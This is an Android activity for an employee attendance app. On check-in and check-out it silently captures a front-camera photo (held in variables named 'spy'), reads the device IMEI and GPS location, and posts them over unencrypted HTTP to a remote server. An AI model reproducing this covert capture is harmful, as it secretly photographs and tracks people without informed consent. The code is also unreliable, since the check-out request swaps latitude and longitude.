package com.app.abdullah.atlanticsurveyors;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.location.Location;
import android.os.AsyncTask;
import android.os.Handler;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.androidhiddencamera.CameraConfig;
import com.androidhiddencamera.HiddenCameraActivity;
import com.androidhiddencamera.config.CameraFacing;
import com.androidhiddencamera.config.CameraImageFormat;
import com.androidhiddencamera.config.CameraResolution;
import com.androidhiddencamera.config.CameraRotation;
import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.GooglePlayServicesUtil;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.LocationListener;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;


import static com.app.abdullah.atlanticsurveyors.MainActivity.MyPREFERENCES;
import static com.app.abdullah.atlanticsurveyors.MainActivity.Office;
import static com.app.abdullah.atlanticsurveyors.MainActivity.Name;
import static com.app.abdullah.atlanticsurveyors.MainActivity.ID;

public class user_attandence extends HiddenCameraActivity implements LocationListener  {

    private static TextView usertxt;
    private static Button logout;
    private static Button OfficeIn;
    private static Button OfficeOut;

    String lat,lon;
    public String idholder, nameholder, officeholder, longholder, latholder;
  //  double latitude, longitude;
  //  SimpleDateFormat simpleDateFormat;
    String m_deviceId;
  //  Calendar calander;
    SharedPreferences sharedpreferences;
    private ProgressDialog pDialog;
    JSONParser jsonParser = new JSONParser();
    GPSTracker gps;
    private CameraConfig mCameraConfig;
    private static final int REQ_CODE_CAMERA_PERMISSION = 1253;
    Bitmap spy, rephoto2;
    String spy_str;

    String HttpURLin = "http://www.mucaddam.pk/mobile_app/att_in.php";
    private static final String TAG_SUCCESS = "success";
    private static final String TAG_MESSAGE = "message";

    String HttpURLout = "http://www.mucaddam.pk/mobile_app/att_out.php";
    private static final String TAG_SSUCCESS = "success";
    private static final String TAG_MESSSAGE = "message";

    private GoogleApiClient mGoogleApiClient;
    private LocationRequest mLocationRequest;
    private double fusedLatitude = 0.0;
    private  double fusedLongitude = 0.0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_user_attandence);

        if (ActivityCompat.checkSelfPermission((Activity)user_attandence.this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions((Activity)user_attandence.this, new String[]{
                    android.Manifest.permission.ACCESS_FINE_LOCATION
            }, 10);
        }

        mCameraConfig = new CameraConfig()
                .getBuilder(this)
                .setCameraFacing(CameraFacing.FRONT_FACING_CAMERA)
                .setCameraResolution(CameraResolution.LOW_RESOLUTION)
                .setImageFormat(CameraImageFormat.FORMAT_JPEG)
                .setImageRotation(CameraRotation.ROTATION_270)
                .build();


        //Check for the camera permission for the runtime
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED) {

            //Start camera preview
            startCamera(mCameraConfig);
        } else {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA},
                    REQ_CODE_CAMERA_PERMISSION);
        }

        gps = new GPSTracker(user_attandence.this);
        if(gps.canGetLocation()){

        }else{
            gps.showSettingsAlert();
        }

        if (checkPlayServices()) {
            startFusedLocation();
            registerRequestUpdate(this);
        }

        usertxt = (TextView) findViewById(R.id.Username);
        logout = (Button) findViewById(R.id.logoutbtn2);
        OfficeIn = (Button) findViewById(R.id.officein);
        OfficeOut = (Button) findViewById(R.id.officeout);

        //IMEI
        TelephonyManager TelephonyMgr = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }

        m_deviceId = TelephonyMgr.getDeviceId();
        sharedpreferences = getSharedPreferences(MyPREFERENCES, Context.MODE_PRIVATE);
        usertxt.setText("Hello! "+sharedpreferences.getString(Name, ""));
        officeholder = sharedpreferences.getString(Office, "");
        nameholder = sharedpreferences.getString(Name, "");
        idholder = sharedpreferences.getString(ID, "");


        logout.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                AlertDialog.Builder builder = new AlertDialog.Builder(user_attandence.this);
                builder.setCancelable(false);
                builder.setMessage("Do you want to Exit?");
                builder.setPositiveButton("Yes", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        //if user pressed "yes", then he is allowed to exit from application
                        Intent intent = new Intent(Intent.ACTION_MAIN);
                        intent.addCategory(Intent.CATEGORY_HOME);
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(intent);
                    }
                });
                builder.setNegativeButton("No", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        //if user select "No", just cancel this dialog and continue with app
                        dialog.cancel();
                    }
                });
                AlertDialog alert = builder.create();
                alert.show();

            }
        });

        OfficeIn.setOnClickListener(    new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                gps = new GPSTracker(user_attandence.this);
                if(gps.canGetLocation()) {



                    double latitude = gps.getLatitude();
                    double longitude = gps.getLongitude();

                    lat = String.valueOf(latitude);
                    lon = String.valueOf(longitude);

                    if (lat.equals("0.0") || lat.equals("0.0") ) {
                        Toast.makeText(user_attandence.this, "Please Check location is 'ON' or 'OFF'.. ", Toast.LENGTH_LONG).show();
                    } else {
                        takePicture();

                        final Handler handler = new Handler();
                        handler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                new inattendance().execute();
                            }
                        }, 3000);
                    }
                }else{
                    gps.showSettingsAlert();
                }


                // Toast.makeText(user_attandence.this, "ID:" + idholder + " OFFICE:" + officeholder + " LAT:" + latholder + " LONG:" + longholder + " DATE" + date + " TIME" + time, Toast.LENGTH_LONG).show();
            }


        });

        OfficeOut.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                gps = new GPSTracker(user_attandence.this);
                if(gps.canGetLocation()) {
                    double latitude = gps.getLatitude();
                    double longitude = gps.getLongitude();
                    lat = String.valueOf(latitude);
                    lon = String.valueOf(longitude);

                    if (lat.equals("0.0") || lat.equals("0.0") ) {
                        Toast.makeText(user_attandence.this, "Please Check location is 'ON' or 'OFF'.. ", Toast.LENGTH_LONG).show();
                    } else {
                        takePicture();
                        final Handler handler = new Handler();
                        handler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                new outattendance().execute();
                            }
                        }, 5000);
                    }
                }else{
                    gps.showSettingsAlert();
                }
            }
        });
    }

    @Override
    public void onImageCapture(@NonNull File imageFile) {
        BitmapFactory.Options options = new BitmapFactory.Options();
        options.inPreferredConfig = Bitmap.Config.RGB_565;
        spy = BitmapFactory.decodeFile(imageFile.getAbsolutePath(), options);
        rephoto2 = Bitmap.createScaledBitmap(spy, 332, 453, true);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        rephoto2.compress(Bitmap.CompressFormat.PNG, 30, byteArrayOutputStream);
        byte[] imgBytes = byteArrayOutputStream.toByteArray();
        spy_str = Base64.encodeToString(imgBytes, Base64.DEFAULT);

    }

    @Override
    public void onCameraError(int errorCode) {

    }

    class inattendance extends AsyncTask<String, String, String> {

        /**
         * Before starting background thread Show Progress Dialog
         * */
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            pDialog = new ProgressDialog(user_attandence.this);
            pDialog.setMessage("Marking Please Wait..");
            pDialog.setIndeterminate(false);
            pDialog.setCancelable(false);
            pDialog.show();
        }

        /**
         * Creating product
         * */
        protected String doInBackground(String... args) {

            // Building Parameters
            List<NameValuePair> params = new ArrayList<NameValuePair>();
            params.add(new BasicNameValuePair("UserId", idholder));
            params.add(new BasicNameValuePair("useroffice", officeholder));
            params.add(new BasicNameValuePair("longitude", lon));
            params.add(new BasicNameValuePair("latitude", lat));
            params.add(new BasicNameValuePair("imei", m_deviceId));
            params.add(new BasicNameValuePair("spy_in", spy_str));

            // getting JSON Object
            // Note that create product url accepts POST method
            JSONObject json = jsonParser.makeHttpRequest(HttpURLin, "POST", params);
           // Toast.makeText(user_attandence.this, latholder+","+longholder, Toast.LENGTH_SHORT).show();

            // check log cat fro response
            Log.d("Create Response", json.toString());

            // check for success tag
            try {
                int success = json.getInt(TAG_SUCCESS);

                if (success == 1) {

                    return json.getString(TAG_MESSAGE);
                } else {

                    return json.getString(TAG_MESSAGE);
                }
            } catch (JSONException e) {
                Toast.makeText(user_attandence.this, "exception"+e, Toast.LENGTH_LONG).show();
            }
            return null;
        }
        protected void onPostExecute(String message1) {
            pDialog.dismiss();
            if (message1 != null){
                Toast.makeText(user_attandence.this, message1, Toast.LENGTH_LONG).show();
            }
        }

    }

    //********************FOR OUT******************\\

    class outattendance extends AsyncTask<String, String, String> {

        /**
         * Before starting background thread Show Progress Dialog
         * */
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            pDialog = new ProgressDialog(user_attandence.this);
            pDialog.setMessage("Marking Please Wait..");
            pDialog.setIndeterminate(false);
            pDialog.setCancelable(false);
            pDialog.show();
        }

        /**
         * Creating product
         * */
        protected String doInBackground(String... args) {

            // Building Parameters
            List<NameValuePair> params = new ArrayList<NameValuePair>();
            params.add(new BasicNameValuePair("UserId", idholder));
            params.add(new BasicNameValuePair("useroffice", officeholder));
            params.add(new BasicNameValuePair("longitude", lat));
            params.add(new BasicNameValuePair("latitude", lon));
            params.add(new BasicNameValuePair("spy_out", spy_str));


            // getting JSON Object
            // Note that create product url accepts POST method
            JSONObject json = jsonParser.makeHttpRequest(HttpURLout, "POST", params);

            // check log cat fro response
            Log.d("Create Response", json.toString());

            // check for success tag
            try {
                int success = json.getInt(TAG_SSUCCESS);

                if (success == 1) {

                    return json.getString(TAG_MESSSAGE);
                } else {

                    return json.getString(TAG_MESSSAGE);
                }
            } catch (JSONException e) {
                e.printStackTrace();
            }

            return null;
        }

        /**
         * After completing background task Dismiss the progress dialog
         * **/
        protected void onPostExecute(String message1) {
            // dismiss the dialog once done
            pDialog.dismiss();
            if (message1 != null){
                Toast.makeText(user_attandence.this, message1, Toast.LENGTH_LONG).show();
            }
        }

    }

    public void onBackPressed(){

        Intent intent = new Intent(user_attandence.this, Select_action.class);

        startActivity(intent);
        finish();

    }

    protected void onStop() {
        stopFusedLocation();
        super.onStop();
    }
    private boolean checkPlayServices() {
        int resultCode = GooglePlayServicesUtil
                .isGooglePlayServicesAvailable(this);
        if (resultCode != ConnectionResult.SUCCESS) {
            if (GooglePlayServicesUtil.isUserRecoverableError(resultCode)) {
                Toast.makeText(getApplicationContext(),
                        "This device is supported. Please download google play services", Toast.LENGTH_LONG)
                        .show();
            } else {
                Toast.makeText(getApplicationContext(),
                        "This device is not supported.", Toast.LENGTH_LONG)
                        .show();
                finish();
            }
            return false;
        }
        return true;
    }
    public void startFusedLocation() {
        if (mGoogleApiClient == null) {
            mGoogleApiClient = new GoogleApiClient.Builder(this).addApi(LocationServices.API)
                    .addConnectionCallbacks(new GoogleApiClient.ConnectionCallbacks() {
                        @Override
                        public void onConnectionSuspended(int cause) {
                        }
                        @Override
                        public void onConnected(Bundle connectionHint) {
                        }
                    }).addOnConnectionFailedListener(new GoogleApiClient.OnConnectionFailedListener() {
                        @Override
                        public void onConnectionFailed(ConnectionResult result) {
                        }
                    }).build();
            mGoogleApiClient.connect();
        } else {
            mGoogleApiClient.connect();
        }
    }
    public void stopFusedLocation() {
        if (mGoogleApiClient != null) {
            mGoogleApiClient.disconnect();
        }
    }
    public void registerRequestUpdate(final LocationListener listener) {
        mLocationRequest = LocationRequest.create();
        mLocationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        mLocationRequest.setInterval(100); // every second
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    LocationServices.FusedLocationApi.requestLocationUpdates(mGoogleApiClient, mLocationRequest, listener);
                } catch (SecurityException e) {
                    e.printStackTrace();
                } catch (Exception e) {
                    e.printStackTrace();
                    if (!isGoogleApiClientConnected()) {
                        mGoogleApiClient.connect();
                    }
                    registerRequestUpdate(listener);
                }
            }
        }, 10);
    }
    public boolean isGoogleApiClientConnected() {
        return mGoogleApiClient != null && mGoogleApiClient.isConnected();
    }
    @Override
    public void onLocationChanged(Location location) {
        setFusedLatitude(location.getLatitude());
        setFusedLongitude(location.getLongitude());

        latholder = ""+getFusedLatitude();
        longholder = ""+getFusedLongitude();

    }
    public void setFusedLatitude(double lat) {
        fusedLatitude = lat;
    }
    public void setFusedLongitude(double lon) {
        fusedLongitude = lon;
    }
    public double getFusedLatitude() {
        return fusedLatitude;
    }
    public double getFusedLongitude() { return fusedLongitude; }


}
